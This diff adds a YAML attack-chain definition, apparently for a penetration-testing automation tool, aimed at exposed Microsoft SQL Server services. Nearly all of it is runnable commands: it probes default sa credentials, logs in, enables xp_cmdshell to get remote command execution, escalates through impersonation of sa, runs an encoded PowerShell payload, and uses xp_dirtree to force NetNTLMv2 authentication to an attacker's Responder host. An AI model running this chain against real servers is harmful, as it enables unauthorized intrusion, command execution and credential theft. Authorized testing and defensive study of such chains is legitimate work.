@@ -1,0 +1,54 @@
+chain_id: mssql_open
+title: "MSSQL — login + xp_cmdshell to RCE"
+severity: HIGH
+tags: [mssql, database, sqlserver, xp_cmdshell, rce]
+
+trigger:
+  any_of:
+    - { port: 1433 }
+    - { service: ms-sql-s }
+    - { service_pattern: "(?i)mssql|sqlserver" }
+
+description: |
+  Open MSSQL service. With valid credentials (often default sa/blank or
+  a low-priv user with `IMPERSONATE` on sa), MSSQL gives command execution
+  on the host via xp_cmdshell. netexec automates the whole flow.
+
+steps:
+  - id: 1
+    title: "Probe common defaults"
+    command: |
+      netexec mssql $VICTIMA -u sa -p ''
+      netexec mssql $VICTIMA -u sa -p sa
+      netexec mssql $VICTIMA -u sa -p Password1
+
+  - id: 2
+    title: "Open an interactive client"
+    command: impacket-mssqlclient $DOMAIN/USUARIO:'PASSWORD'@$VICTIMA -windows-auth
+
+  - id: 3
+    title: "Enable xp_cmdshell and run a command"
+    command: |
+      EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+      EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+      EXEC xp_cmdshell 'whoami';
+
+  - id: 4
+    title: "If your user has IMPERSONATE on sa — escalate then xp_cmdshell"
+    command: |
+      EXECUTE AS LOGIN = 'sa';
+      SELECT SYSTEM_USER;
+      EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+      EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+      EXEC xp_cmdshell 'powershell -enc <BASE64>';
+
+  - id: 5
+    title: "Capture NetNTLMv2 by coercing MSSQL to authenticate to your Responder"
+    command: |
+      # On Kali:
+      sudo responder -I tun0
+      # In MSSQL:
+      EXEC master..xp_dirtree '\\\\10.0.2.15\\share\\';
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
